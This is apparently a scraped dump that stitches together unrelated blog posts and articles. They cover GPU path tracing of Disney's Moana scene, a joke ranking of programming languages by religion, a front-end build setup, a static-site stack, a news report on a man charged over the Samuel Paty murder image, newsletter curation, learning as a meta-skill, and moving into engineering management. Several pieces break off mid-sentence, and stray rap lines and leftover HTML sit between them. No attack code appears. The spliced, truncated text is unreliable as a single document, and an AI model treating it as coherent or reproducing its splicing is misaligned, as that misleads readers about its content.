<p>All these different sandboxes were all nice and well …. but none of those sandboxes ever went all the way, and not one ever<em> </em>rendered the that model in the way you’d expect it to look: either the respective sandbox didn’t have a path tracer, or it didn’t include the water, or it didn’t use the lights, or the textures, or the curves, or … something that made it “un-showable”. That’s not to say that I didn’t ever have any of these individual components: in fact, I had some reservoir-sampling based direct lighting (from both quad lights and HDR envmap) over a year ago; I also at some point borrowed the Disney BRDF implementation from Will “TwinkleBear” Usher’s <em>ChameleonRT</em> ray tracer (<a href="https://github.com/Twinklebear/ChameleonRT">https://github.com/Twinklebear/ChameleonRT</a>); I had baking of the PTex textures in my github <em>pbrtParser</em> repo (<a href="https://github.com/ingowald/pbrt-parser">https://github.com/ingowald/pbrt-parser</a>) a long while back; Dave Hart gave me his curves tessellation code for the PBRT curves a loooong time ago, etc …. I just never had all of those particular pieces in the same viewer at the same time. </p>



<p>Anyway – I <em>still </em>don’t have <em>all </em>these pieces together right now, but triggered by Chris’ blog post last week I at least sat down and started pulling together all the pieces I still had, and trying to get my Moana back to rendering on a GPU. In particular, I finally sat down and extended my path tracer to also be able to handle water, by pretty much stealing Pete Shirley’s “Dielectric” material from his “Ray Tracing on a Weekend” series (because yes, I have no clue about things like Schlick, Fresnel, etc) …. and as of Saturday night, I finally have some “first light”, including something that’s at least looking like water:</p>

<p>BTW: The above renders quite interactively; currently at something like 25-ish fps on a RTX 8000 (at 2560×1080), and using about 32 out of the 48GBs of RAM. I (obviously) use progressive refinement, so while you move around the image is somewhat more noisy – but by the time you can even click on the screenshot app you pretty much get the above. (I’ll release the code at some point in time, when I cleaned it up a bit).</p>



<h2>Moana on the GPU: Main Challenges</h2>



<p>As several previous posts/articles have pointed out, there are a multitude of challenges in this model. I’d particularly point to Matt Pharr’s original <a href="https://pharr.org/matt/blog/2018/07/08/moana-island-pbrt-1.html">“Swallowing the Elephant” </a>series; to my own blog post (and accompanying paper) on <a href="https://ingowald.blog/2020/01/09/digesting-the-elephant/">“Digesting the Elephant”</a>; and to Chris Hellmuth’s recent “<a href="https://www.render-blog.com/">GPU-Motonui</a>” blog.</p>



<p>Most of these issues revolve around the sheer amount of data involved in this model,  and in particular the data wrangling required to even get it <em>loaded </em>into a form that you can even <em>start </em>rendering it. For the GPU version, however, a few of these particularly stuck out:</p>



<ul><li><strong>Textures: </strong>All the textures in Moana are in Disney’s PTex format …. but there’s no PTex on the GPU, yet (at least, none that I could find). My first versions rendered without textures, but  without textures, this model looks <em>really</em> different, as you can see by playing with this fancy new wordpress “image compare” feature:</li></ul>



<figure><p><img id="434" src="https://ingowaldblog.files.wordpress.com/2020/10/big-bad-1.png" alt="" width="2488" height="1016"><img id="436" src="https://ingowaldblog.files.wordpress.com/2020/10/big-good-1.png" alt="" width="2488" height="1016"></p></figure>



<ul><li><strong>Envmap</strong>: The envmap not only comes in two forms (EXR for HDR, and png for the default PBRT model), it’s also super-important to exactly match the orientation used in the pbrt file: in particular, the envmap is <em>tilted </em>to the back to account for the fact that the default camera points downwards; if you don’t do that you see the envmap’s lower “ground” half peeking through betwen the ocean and the clouds, which is really disturbing. I had to literally copy pieces of Matt’s PBRT code over to make it match <img width="16" height="16" draggable="false" alt=":-/" src="https://s1.wp.com/wp-content/mu-plugins/wpcom-smileys/uneasy.svg"></li><li><strong>Instance count</strong>: The model has close on a 40 million instances (even <em>if</em> you make sure to only create those you need ….) – but early versions of OptiX only allowed 16 million per instance BVH. Early versions of OptiX didn’t allow multi-level instancing, either, so at times I had to have three “root” BVHes to trace into serially. Later versions used two-level instancing, which one root IAS over smaller second-level IASes …. which of course asks the question of “how do you best partigion 40 million instances into N groups of less than 16M each …. but I digress – since 7.1 OptiX can do more than 40 million, so this problem is gone.</li><li><strong>Number of tiny meshes:</strong>  Though the PBRT file contains some really big meshes, there are also a <em>lot </em>(!) of tiny ones. This was an issue mostly for OptiX 6, but even in OptiX 7 this would create a lot of different build inputs and SBT entries. Even worse, for some of the objects one ends up with a few really large meshes plus a ton of tiny ones, all in the same group/BVH…. which caused some other issues. </li><li><strong>Water</strong>: The water in this scene is actually particularly tricky: not only do you need a water shader at all, the water is also – in some parts of the model – modeled <em>twice</em> : there’s the main body of water in a giant box (with some low-frequency waves pattern on top), but there’s also a second surface with a higher-resolution tessellation of the waves within the default camera frustum. Now as long as you <em>only </em>use that default camera it’ll be OK, but once you move around, and some pixels refract the water twice, you get some really disturbing pictures.</li><li><strong>Memory</strong>: This model is big. Really big.       </li></ul>



<h2>Moana on RTX: Current State</h2>



<p>In its current state, my sandbox does the following:</p>



<ul><li><strong>Textures</strong>: To make the ptex-textures appear on the GPU I currently use some bake-out tool I wrote for exactly that purpose: For each of the input model’s polygon meshes I first re-construct the original quads, and bake out a tiny 16×16 texel “micro-texture” for each of those quads; these then get throws into a larger texture atlas that gets uploaded as a 2k-x-whatever CUDA texture. During rendering, the code material shader then reconstructs the current triangle’s corresponding texture coordinates within its corresponding mesh’s atlas, and uses a cuda bi-linear texture lookup. Total memory for that – at 16×16 texels per quad – is about 3.5GB, which isn’t too bad. I’m sure that this baking out does create some lower texture quality than PTex, but right now I’m pretty happy with it – it also saves a ton of memory (3.5GB vs 40-ish in original PTex files), and is super-fast (’cause I can use texture hardware …).</li><li><strong>Materials</strong>: Though I did have some Disney BRDF at some point in time (borrowed from Will’s ChameleonRT) I could never make this work with the water. Currently, I use the material’s “specTrans” value to determine if the material is water or not, and use either Pete Shirley’s RTOW “Dielectric” material (for water), or his “Lambertian” (for everything else). For the water I’m tracking whether I’m already in/out of the water, and just pass straight through any second water surface the path may encounter.</li><li><strong>Lights: </strong>I currently use a plain forward path tracer, until the path hits the environment map. All other light soruces get ignores, and even for the envmap I currently use only the LDR version, since that’s what the original PBRT file uses.</li><li><strong>Curves:</strong> Curves currently get tessellated into triangle meshes during loading. Since this generates a ton of additional geometry I use a very low tessellation rate, but still can’t see any artifacts from that, likely because the input patches are already pretty small.</li><li><strong>Triangle Meshes:</strong> every other geometry in this model is a triangle mesh, anyway. To avoid the many small meshes I currently merge all triangle meshes within a PBRT “object” into a single, large triangle mesh, and store, for each triangle in this model, an index of a tiny struct describing the corresponding sub-mesh’s data. This triangle mesh then gets uploaded to OWL, by creating the proper OWLGeom and OWLTrianglesGeomGroup. <br>To save on memory I do <em>not </em>use the <em>texcoord</em> and <em>primitiveID</em> arrays from the PBRT file, and simply compute this information on the fly in the CH program.</li><li><strong>Instances</strong>: For older versions of OptiX I had to do some extra steps with multiple BVHes and/or multi-level instancing; in the latest version this is no longer required: I simply create a single list of all instances, throw those into and OWLInstanceGroup, and done.</li><li><strong>Model import</strong>: I use my …</li></ul></div></div>

My algorithms fly, my rhythm so sly
Don’t mean to rub it in yo faces

Are for the ages. They’re the rages.

<section><div itemprop="text"><p><strong>Python</strong>: It’s the obvious choice. Elegant, powerful, concise. But can you really see Jesus using a programming language named after the creature who tempted Eve and doomed humanity to exile from the Garden of Eden? No, me either.</p>
<p><strong>PERL</strong>: Its users swear by it, but lacking mainstream support or system level visual development interfaces, it’s unlikely the saviour of mankind would choose PERL for such a task.<span id="more-981"></span></p>
<p><strong>Visual Basic / .NET</strong>: Being a proprietary language, subject to licensing and usage restrictions Jesus would probably denounce such a framework, overturning tables and throwing the money lenders out of the temple.</p>
<p><strong>Objective C#</strong>: I can see Jesus coding for iOS mobile devices, spreading love and forgiveness via free iPhone apps. But being tied to the restricted iTunes store wouldn’t allow him to spread his apps to Android users.</p>
<p><strong>Java</strong>: Runs on all platforms and is truly object oriented, Java seems like a good choice for Jesus. Jesus on Java? Maybe. Although the language’s general slow speed and clunkiness aren’t the kind of cool Jesus wants.</p>
<p><strong>Ruby</strong>: Complex structures and language made easy. A higher level for better human understanding, Ruby sounds a lot like how Jesus operated. Unfortunately Ruby isn’t mainstream enough for someone like Jesus to consider if he wants to reach the masses.</p>
<p><strong>PHP: </strong>Freely available, open source, widely adopted, PHP also seems like a possible contender for Jesus’ next rapid development programming project. PHP just isn’t sophisticated enough to stand up against the bigger languages though. Maybe Jesus will port his apps to PHP when it gets some proper exception handling and performance improvements.</p>
<p><strong>C / C++</strong>: Being the most popular programming language(s) in the world, it’s quite possible that Jesus is a C/C++ programmer. Drawing on years of programming wisdom, and weaving itself into the fabric of modern society, C/C++ seem a natural fit for son of God.</p>
<p><a ref="magnificPopup" href="https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus.jpg"><img title="jesus" src="https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus.jpg" alt="" width="322" height="433" srcset="https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus.jpg 322w, https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus-223x300.jpg 223w" sizes="(max-width: 322px) 100vw, 322px"></a></p>
<p>If we look at all the worlds most popular religions and group them with the world’s most popular programming languages it looks like this :</p>
<p><strong>1. C/C++ | Christianity&nbsp;</strong><br><strong>2. JAVA | Muslims</strong><br><strong>3. PHP | Hindus</strong><br><strong>4. Javascript | Buddhists</strong><br><strong>5. Python | Sikhs</strong><br><strong>6. C# | Jews&nbsp;</strong></p>
<p>I will leave you to draw inferences and generalisations, but the last thing was need is a religious based programming language war. History has shown us that nerd flame wars are quite intense and uncivilised.</p>

	<time datetime="2020-10-26">October 26, 2020</time>
  
	<p>Modern web development is <a href="https://www.vrk.dev/2019/07/11/why-is-modern-web-development-so-complicated-a-long-yet-hasty-explanation-part-1/">notorious for being complicated</a> and a source of heated discussions around the web. Because of the endless new libraries and inter-mingled dependencies, making a simple web application has never been this complicated.</p>

<p>To illustrate, a new <a href="https://github.com/facebook/create-react-app">create-react-app</a> with TypeScript, sass, and bootstrap consumes around 536M of dependencies. That’s a half gigabyte to run a boilerplate web page: It’s beyond insanity! Is this complexity self-inflicted, or an outcome of a complex surface?</p>

<p>To find out, I set to create the development and build environments from scratch.</p>

<p>First, let’s set my requirements for the development environment and the final build.</p>

<ul>
<li><p><strong>Optimize for production</strong>: Typically, the production build will generate 3 files: <code>index.html</code>, <code>javascript.js</code> and <code>style.css</code> and a <code>resources</code> directory for files like images or fonts. Since I’m building <a href="https://en.wikipedia.org/wiki/Single-page_application">SPA</a>s, I don’t expect to have other web pages.</p></li>
<li><p><strong>One step</strong>: A single step (command) to make a final build of the web app. The same for kick-starting the development environment.</p></li>
<li><p><strong>TypeScript</strong>/<strong>Sass</strong>: These are personal preferences. TypeScript is recommended for large applications and Sass is nice to have.</p></li>
<li><p><strong>Live Reload</strong>: Changes automatically detected, and should trigger a re-build and refresh the browser.</p></li>
<li><p><strong>React</strong>, <strong>Bootstrap</strong>, <strong>Vuejs</strong> or <strong>Not</strong>:  Should be able to add React, Bootstrap, Vuejs or any other libraries. But should also be able to create the app without any dependencies; so no assumptions of frameworks.</p></li>
<li><p><strong>Minimal</strong>: Only include what we use; no more.</p></li>
</ul>

<p>There is an excess of options, any choice is going to be driven by personal preferences. I try to reason below what I picked.</p>

<ul>
<li><p><strong>gulp</strong>: <a href="https://gulpjs.com/">gulp</a> is a build tool that pipelines resources and transforms them. I like the idea of pipelining as it gives the flexibility to integrate with <em>any</em> program.</p></li>
<li><p><strong>webpack</strong>: <a href="https://webpack.js.org/">webpack</a> is primarily a module <em>bundler</em> that could be used as a build tool. I find gulp superior as a build tool, and webpack superior as a bundler/transpiler. So I mixed both.</p></li>
<li><p><strong>npm</strong>: yarn is the hot new thing for package management, but npm did catch up.</p></li>
<li><p><strong>browser-sync</strong>: <a href="https://browsersync.io/">Browsersync</a> is quite advanced and is very configurable. It also plays nicely with gulp.</p></li>
</ul>

<p>If this seems complicated, you don’t know the half of it. There are many  other plugins to use with gulp and webpack; and TypeScript is quite a challenge to get it to compile on reasonable performance.</p>

<p>The diagram below is actually a simplification of the whole workflow.</p>

<p><a href="https://svbtleusercontent.com/fk7oKCMeeZoRAXM5myvEBT0xspap.png"><img src="https://svbtleusercontent.com/fk7oKCMeeZoRAXM5myvEBT0xspap.png" alt="workflow.png"></a></p>

<p>The final boilerplate can be found in this Github repository: <a href="https://github.com/omarabid/front-root">front-root</a>. It’s still an experimental boilerplate, so use with caution.</p>

<p>There is a total of 5020 dependencies, 2590 of which are unique (non deduplicated). The total size of the <code>node_modules</code> directory is <code>287M</code>. So I guess we did a bit better than the react-create-app…</p>

<p>Here is the full list of the dependencies tree.</p>

October 26, 2020 | https://wearedignified.com/blog/how-we-built-ghost-static-site-generator | <a href="https://web.archive.org/web/*/https://wearedignified.com/blog/how-we-built-ghost-static-site-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><blockquote><p><strong>TL;DR</strong> - We are using Eleventy and Gulp to generate individual HTML pages from Nunjucks templates. The content is saved as Markdown files and JSON collections for repeating styles. For blog and podcast content, we're using a Ghost self-hosted instance as our CMS API. Newsletter is handled by AWS SES and finally AWS Lambda serverless functions to handle our backend magic. All in all, development took approximately 13 full business days to complete this project.</p></blockquote><h2 id="whydowecare">Why do we care?</h2><p>Every technical decision is a serious decision. As much as we all preach "moving fast and breaking things", we still need to consider the amount of technical debt we are slowly creating with every decision. That being said, there's a clear sweet spot where you optimize for future flexibility while simultaneously allowing you to move quickly to build your product.</p><p>Some builds are larger than others. Let's take a SaaS product like Basecamp for example. You may choose to build your main product off a larger monolithic base such as Ruby on Rails or to separate each piece into multiple units to offer you more flexibility. Either way, you need to consider the balance between speed and flexibility. For Dignified, we decided to take a more fragmented micro-service approach and separate tasks into smaller pieces to avoid creating too much technical debt.</p><blockquote><p>If you are interested in a breakdown comparison of a micro-service approach over a monolithic approach, send me a tweet <a href="https://twitter.com/karlclement">@karlclement</a>!</p></blockquote><h2 id="howwedecided">How we Decided</h2><p>All of our choices were based on a few guiding rules:</p><ul><li>Anyone can regularly add new content</li><li>We have multiple content types with varying visual representations</li><li>We have a custom design</li><li>The website must render as fast as possible while fully implementing SEO tactics</li><li>Lightweight server footprint with minimal maintenance</li></ul><p>These items allowed us to pick and choose the tools we needed that fit the criteria. We can easily maintain a balance between speed and flexibility without diminishing the user's experience.</p><h2 id="thebreakdown">The Breakdown</h2><p>This is where it get's a bit technical, feel free to skip if you aren't interested in the implementation.</p><p>We started by separating our backend operations from our frontend rendering. This allows us to take advantage of SEO benefits and faster page loads while using multiple remote sources of content. This would also require static pages generated for every page on the site. Every time we update our content, each new page must be generated and deployed.</p><p>There are multiple libraries to help you generate static websites. Some of the most notable candidates are Jekyll, Hugo, Hexo, Eleventy, Gatsby and Nextjs. Gatsby and NextJs are heavily dependant on ReactJs for your component library. Jekyll, Hugo and Hexo have specific templating patterns to generate content, similar to Wordpress.</p><p>Finally we decided to use <a href="https://www.11ty.dev/">Eleventy</a>. Eleventy allows you to create any kind of template, with the templating language you want. It also allows you to pull content from locally available files or even hosted REST APIs.</p><h3 id="thecontent">The Content</h3><p>Since Eleventy allows you to pull content from external sources, we decided to use a very popular blogging platform known as <a href="https://ghost.org/">Ghost</a>. Other good candidates for external CMS platforms are Netlify CMS, Strapi, Forestry, Prismic, Contently and many more.</p><p>The only content we decided to pull from Ghost were blog posts and podcast summary posts. Since these two post types seem to follow a traditional blog post pattern, it was easy to create a template for each of these types in Eleventy.</p><p>Projects are then generated from a JSON content file with details and descriptions of each project we have worked on. This includes images, callouts, and calls to action. We needed to create a custom template with Eleventy for the project content type.</p><h3 id="templating">Templating</h3><p>Eleventy is very flexible when creating templates. You have the option to use Nunjucks, EJS, Handlebars, Mustache, Haml and many others. We decided to use the <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> templating library since it allowed us to embed more complex Javascript operations and macros in our templates.</p><p>With Nunjucks, we created individual templates to use each of the data types described above. Nunjucks also allows you to create partials and macros to be embeded in multiple places on the site similar to React or Angular components. These reusable pieces can also be used to layout templates used to provide a visual base for your template. In our case, we have three types of layout: a darker theme, lighter theme, and the sidebar theme.</p><p>To compile the Javascript, SCSS (Sass CSS) and HTML together, we used <a href="https://gulpjs.com/">GulpJs</a>. This allowed us to create a build script with commands to compile, convert, and compress our Javascript and SCSS in browser compatible code. We can also use these commands to prepare files for deploy to a production environment.</p><h3 id="hosting">Hosting</h3><p>Since we separated our platform into three main components, our frontend could be hosted on an entirely static platform (no need for a database or data processing). You have quite a few options for static hosting including Netlify, AWS S3, Surge.sh, Render, etc. Since we already love <a href="https://render.com/">Render</a>, we chose their static hosting solution. A huge benefit to Render is the deploy webhook that allows you to trigger a new compile and deploy when content changes.</p><p>Now to host our content for the blog and podcast posts, we are self hosting an instance of Ghost on a Digital Ocean droplet. If you are comfortable with DevOps, you can easily spin up a one-click Ghost droplet or even a Linux Ubuntu instance to install your Ghost CMS. Once you have your CMS ready, you can use it to manage your content and provide that information via a REST API. Ghost also allows you to send out a POST to a webhook when content is updated.</p><p>Finally, all processing like our email newsletter subscriptions and marketing campaigns are handled by NodeJs methods hosted on AWS Lambda. It's a very clean and scalable way to handle external operations that aren't available on static website hosting platforms.</p><blockquote><p>If you want me to detail the steps to hosting our site, or any of the steps above, tweet me at <a href="https://twitter.com/karlclement">@karlclement</a> and I can share that with you.</p></blockquote><h3 id="therest">The Rest</h3><p>The last pieces are mostly marketing tools for analytics and email communications. In order to make things as scalable as possible, we decided to use AWS SES (Simple Email Service) along with <a href="https://emailoctopus.com/">EmailOctopus</a> to handle our email newsletter. EmailOctopus has a great feature that allows you to make your newsletter campaign within their admin interface and send the emails with your own AWS account (which is free up to 62K emails per month).</p><p>AWS Lambda functions handle our newsletter subscriptions and segmentation. We can also enhance these tools to later include more A/B testing and customer service. Analytics are stored and monitored using Google Analytics, <a href="https://plausible.io/">Plausible</a>, and <a href="https://hotjar.com/">Hotjar</a>. This gives us a great view of how our visitors are using our website and what content they prefer to explore.</p><p>This concludes the list of all the tools we have used to deploy our latest build of wearedignified.com. If there is anything you want me to go into deeper detail or other subjects I should cover, please feel free to tweet me <a href="https://twitter.com/karlclement">@karlclement</a></p></section></div>]]>

                        <p>A young man who "liked" a gruesome Twitter picture showing French teacher Samuel Paty after he was murdered has been charged with glorifying terrorism, French authorities said Sunday.</p><p>Paty was attacked and killed on the street for showing his students cartoons of the Prophet Mohammed in a class on free speech.</p><p>His killer, an 18-year-old Chechen refugee who had been living in France since he was a child, was shot dead by police. Before his death he posted a picture of the teacher's severed head on Twitter.</p><p>The 22-year-old man charged on Sunday is also of Chechen origin, the public prosecutor in the central town of Blois, where he lives, said.</p><p>He was already on the radar of the authorities for having endorsed a massacre at the satirical magazine Charlie Hebdo that first published the Mohammed cartoons.</p><p>Several knives and other weapons were found at his home, prosecutor Frederic Chevallier.</p><p>The man denied being radicalised, Chevallier added.</p><p>Since Paty's murder on October 16 the French authorities have launched a clampdown on radical Islam.</p><p>Police have carried out dozens of raids on individuals and organisations suspected of supporting or abetting extremism.</p><p>Depictions of the Prophet Mohammed are considered sacrilegious by many Muslims.</p><p>But in France, which has a long tradition of satirising religion, they are seen as symbolic of free speech.</p>

    <div><p>I curate <a href="https://brainpint.com/">BrainPint</a>, a newsletter for the curious. It's a medley-style newsletter covering personal growth tips, interesting digital tools, business &amp; tech content and even random, rabbit hole internet finds. </p><p>I always aim to find signal within the noise, which means only 5-10% of the best content I discover each week finds its way into my newsletter. That's ~15 quality links.</p></div><p>I often get asked how I curate my newsletter every week. </p><p>In this post I'll give you a look behind the curtains. I'll share about the sources and tools I use to pick the best links and bring it all together. </p><h2 id="sources">Sources</h2><div><p>I read widely. Every week I go through around ~150 articles and 60+ newsletters. I also often find myself wandering down Internet rabbit holes. This means that I never run out of sources to curate from. </p><p>Having quality sources to draw content from is so important. If you're reading garbage, you won't have any meaningful content to curate from. Imagine a newsletter full of Buzzfeed articles?</p></div><figure><img src="https://janelloi.com/content/images/2020/10/Frame-22.png" alt="Sources Of Information - Product Hunt, YourStack, Newsletters, Twitter, Reddit" srcset="https://janelloi.com/content/images/size/w600/2020/10/Frame-22.png 600w, https://janelloi.com/content/images/size/w1000/2020/10/Frame-22.png 1000w, https://janelloi.com/content/images/2020/10/Frame-22.png 1012w" sizes="(min-width: 720px) 720px"><figcaption>Sources Of Information - Product Hunt, YourStack, Newsletters, Twitter, Reddit</figcaption></figure><h3 id="newsletters">Newsletters</h3><p>I'm a huge fan of newsletters, which are my go-to source of information. I love a good mix of curated newsletters &amp; ones that contain original writing. As a writer/curator myself, I respect the hard work that goes into each issue.</p><div><p>I'm subscribed to more than 60+ newsletters in different niches and read most of them. If you're wondering how to curate content for your niche, I recommend subscribing to industry publications.</p><p>It's hard to follow so many newsletters if you're strapped for time. However, I have just the suggestion to keep tabs on multiple things without going bonkers in the tools section below.</p></div><h3 id="product-hunt">Product Hunt</h3><div><p><a href="https://www.producthunt.com/">Product Hunt</a> is where you can find interesting new digital product launches daily. I love checking out the top few products each day. The upvote functionality means that quality products find their way to the top of the page. </p><p>I also visit <a href="https://betalist.com/">BetaList</a> to learn about new startups &amp; what they're creating.</p></div><h3 id="yourstack">YourStack</h3><div><p><a href="https://yourstack.com/">YourStack</a> is a community for users to share the products they love, and the reason why. People create their own stacks and add their favorite apps, books, gadgets, brands and more. By peering into others' stacks, I sometimes find gems to add to my newsletter. </p><p>If you have ever wondered "What does this person have on their homescreen?" "What watch does she wear?", you can get your answers on YourStack. It's now in public beta. You can <a href="https://yourstack.com/@JanelSGM">check out my stack.</a></p></div><h3 id="subreddits">Subreddits</h3><div><p>I trawl Twitter a lot and bookmark the best ideas and links using Twitter's native bookmark system, which admittedly isn't the best experience. I'm quite protective of who I follow on Twitter, as I believe in curating the feed for quality inputs.</p><p>Ideas on who to follow on Twitter:<br>- Key thought leaders in the industry<br>- CEOs<br>- Journalists<br>- Companies</p><p>P.S. If you have discovered a better way to bookmark tweets (without having to tag accounts like how <a href="https://readwise.io/">Readwise</a> users do), please reach out.</p></div><h3 id="communities">Communities</h3><h3 id="blogs">Blogs</h3><p>I follow a set of blogs I'm interested in via RSS (through Mailbrew). If you're writing a newsletter with a clearly defined niche, follow prominent blogs in your industry to keep yourself updated on the latest developments.</p><h3 id="friends">Friends</h3><p>My friends send me interesting reads or resources via email, Twitter DM or Telegram, which I do include in my newsletter as well.</p><p>At this point you must be thinking I'm a crazy person. I promise you that there is some sort of method to this madness. Here's where tools come in. </p><figure><img src="https://janelloi.com/content/images/2020/10/Frame-24--1-.png" alt="Tools - Mailbrew, Google Sheets, Pocket, Notion" srcset="https://janelloi.com/content/images/size/w600/2020/10/Frame-24--1-.png 600w, https://janelloi.com/content/images/size/w1000/2020/10/Frame-24--1-.png 1000w, https://janelloi.com/content/images/2020/10/Frame-24--1-.png 1012w" sizes="(min-width: 720px) 720px"></figure><p>The great thing about living in 2020 is that we have the help of technology to simplify curation processes.</p><h3 id="mailbrew">Mailbrew</h3><p>I use Mailbrew to pull information from a myriad of sources. It cuts through the noise and distractions of the Internet and delivers me the best content, wrapped in a daily digest. Yeah, I <em>can't really</em> be spending hours trawling Reddit. Mailbrew's my newly-found curation sidekick!</p><h4 id="how-does-it-work">How does it work?</h4><figure><img src="https://janelloi.com/content/images/2020/10/Screen-Shot-2020-10-04-at-04.39.41.png" alt="" srcset="https://janelloi.com/content/images/size/w600/2020/10/Screen-Shot-2020-10-04-at-04.39.41.png 600w, https://janelloi.com/content/images/size/w1000/2020/10/Screen-Shot-2020-10-04-at-04.39.41.png 1000w, https://janelloi.com/content/images/size/w1600/2020/10/Screen-Shot-2020-10-04-at-04.39.41.png 1600w, https://janelloi.com/content/images/size/w2400/2020/10/Screen-Shot-2020-10-04-at-04.39.41.png 2400w" sizes="(min-width: 720px) 720px"></figure><div><p>I subscribe to the RSS feeds of blogs that I love so I don't miss any new posts. I also get Mailbrew to deliver the top posts in each subreddit I follow so I don't need to click on them every day. </p><p>You can also use Mailbrew to set Google Alerts to follow specific topics.</p><p>I love this tool, it saves me so much time. If you're keen on checking Mailbrew out, I have a special discount for you via <a href="https://go.brainpint.com/mailbrew">this link</a>* (Note: links with * are affiliate)</p></div><h3 id="google-sheets">Google Sheets</h3><div><p>Sometimes, I just want to go super fast. When that happens, I use Sheets to curate.</p><p>I built a custom bookmarklet in Chrome (thanks to what I learned from <a href="https://go.brainpint.com/bettersheets">Better Sheets</a>*) that helps me pull the Title of the Page, URL of sites I find interesting directly into a Google Form with a timestamp. I then add comments, and categorize my finds.

          <h3 id="the-single-most-important-thing-you-can-learn-as-a-software-engineer"><strong>The Single Most Important Thing You Can Learn as a Software Engineer</strong></h3>
<h3 id="learn-how-to-learn"><strong>Learn How To Learn</strong></h3>
<h6 id="3min-read"><em>3min read</em></h6>
<p>The web is filled with self-help articles showcasing titles like “How to become a senior software engineer” or “Top 10 technologies you must know in 2020”. There are literally thousands of them.</p>
<p>While many of these articles contain helpful advice, I believe all of them can be distilled into a single lesson:</p>
<p><strong>The single most important thing you can learn as a software engineer is to learn how to learn.</strong></p>
<h3 id="metaskills">Meta-Skills</h3>
<p>Learning how to learn is a meta-skill, which means it’s an ability that will enable you to grow in more than just one area. To name a few examples:</p>
<p>Learning React is a skill. Learning how to quickly pick up new UI frameworks and libraries is a meta-skill.</p>
<p>Learning to communicate effectively with your manager and peers is a skill. Learning how to best develop your emotional intelligence is a meta-skill.</p>
<h3 id="learning-how-to-learn">Learning How to Learn</h3>
<p>So, how do <em>you</em> learn best? Yes, you.</p>
<p>Do you learn from reading articles online? Do you go old-school and read physical copies of actual programming textbooks? Maybe you even spend hours scouring pages of documentation from W3C or MDN.</p>
<p>Do you watch videos online? Maybe you have a favorite YouTube channel or an account on a learning platform like Pluralsight, LinkedIn Learning, or Egghead.</p>
<p>Do you learn by doing? Do you enjoy building pet projects just to try out a new language, library, or framework? Do you practice with coding exercises on a platform like HackerRank or Codewars?</p>
<p>Do you learn from in-person presentations? Do you attend local meetups and conferences? Does your company have lunch-and-learn presentations where you can learn from your co-workers?</p>
<p>I personally use a combination of resources. I read a lot, write a lot, watch video courses, and build side projects. In the end though, it really doesn’t matter how you approach learning. What matters is that you find what works for you.</p>
<h3 id="benefits-of-learning-how-to-learn">Benefits of Learning How to Learn</h3>
<p>If you can master the meta-skill of learning how to learn, the world is full of possibilities. Not only can you pick up new skills, you can do so efficiently.</p>
<p>Need to learn a new programming language? No problem — you know how to understand the basic concepts and quirks of the language quickly.</p>
<p>Starting at a new company with an unfamiliar codebase? No problem — you know what you need to do to get up to speed and hit the ground running.</p>
<p>Looking for a career change? No problem — you know how to develop new abilities and teach yourself the material and skillset you need.</p>
<p><strong>Learn how to learn. Everything else will follow.</strong></p>

<![CDATA[Choosing the Management Track]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>Several months ago a friend of mine reached out to me because he was considering
changing from an individual contributor (IC) role to an engineering management (EM)
role at work. Given the fact that I’ve bounced back and forth a couple times, he
wanted to pick my brain as to what I thought the tradeoffs were and why I
ultimately went back into management.</p>

<p>He’s not the only person to reach out to me about this topic (in fact, a different
friend reached out a week later) so I figured it’d be useful to write a blog post
consolidating my thoughts. I’ll separate this post into two sections: some
significant and perhaps unintuitive changes that are relevant to someone
considering moving from IC to EM, and my personal motives.</p>

<h2 id="the-differences">The differences</h2>

<h3 id="1-you-wont-code-anymore">1: You won’t code anymore.</h3>

<p>I once heard some tongue-in-cheek advice about moving to management: “If the
thought of never coding anymore turns your life to ash, don’t move to management.”
Turns out it’s true.</p>

<p>The “should managers still code?” question is probably the most hotly debated
question about the role change, and I’m taking a side: no. Maybe not immediately
after the switch, because your team may be small enough that it needs your
technical contribution or you may still be the subject matter expert, but as
you climb the management ladder you will move further away from doing any
implementation work. In fact, I’ll argue that managers who cling to coding work
hold back the output of their team.</p>

<p>A popular assumption is this is an outflow of your technical skills becoming
stale. It’s not. I’m not saying it’s impossible, especially on a very extended
timetable that involves core structural shifts in industry practice, but I think
those shifts (and your inability to ramp up on them assuming a strong technical
base - see “<a href="https://charity.wtf/2017/05/11/the-engineer-manager-pendulum/">The Engineer/Manager Pendulum by Charity Majors</a>”)
are rare. The principles of sound software engineering practice are timeless.
But either track requires focus. It’s not that you can’t code, it’s more that
you shouldn’t - your schedule simply won’t allow it.</p>

<p>As a manager, your schedule will become so unavoidably non-deterministic that
you cannot be relied upon by the rest of your team to ship code changes on an
expected cadence. You won’t be able to respond to questions or pull requests
involving the code you previously wrote. You won’t have the bandwidth to ship
updates to that code when requirements change. And in the big picture this is a
problem, because teams distributing and shipping work in concert is the backbone
of successful software development.</p>

<p>The reason for this non-deterministic schedule is rooted in my second difference:</p>

<h3 id="2-management-forces-you-to-care-more-about-everything">2: Management forces you to care more about everything.</h3>

<p>Generally speaking, as an IC the measure of your impact is your individual technical
contribution: work scoped, code successfully deployed to production, RFCs proposed
and reviewed, etc. While this often involves working with others, at the end of
the day you are largely in control of the factors that determine your output. You
can sit at your desk and work more hours. You can write more / better code. You
can add more tests. The success or failure of your technical efforts have more
to do with your effort than anyone else’s.</p>

<p>One of my beliefs about management is borrowed directly from <a href="https://amzn.to/30XV84J">High Output Management by Andy Grove</a>:
the measure of a manager is the output of the organization underneath them. Unfortunately
the factors that sum to a team’s output are far fuzzier than the factors that sum
to an IC’s output. And it’s not as simple as adding up all of the discrete technical
outputs of your ICs because team output is measured via the delivery of coordinated,
high-quality projects over time.</p>

<p>Here are some not uncommon situations:</p>

<ul>
  <li>A team of talented ICs ships high quality work. But they feel no buy-in or
camaraderie within the team or greater organization, and the entire team turns
over within a year. The constant hiring and onboarding makes it difficult to rely
on this team for time-sensitive tasks or reliable ownership over part of a codebase.</li>
  <li>A set of teams spends an extended time working on a project that gets killed
before launch. Turns out it wasn’t the right thing to build. The ICs on that team
turned out high quality work but to a useless outcome.</li>
  <li>A team of talented ICs ships high quality work, but they have one or two very
senior brilliant jerks. Other teams do not like engaging with these brilliant
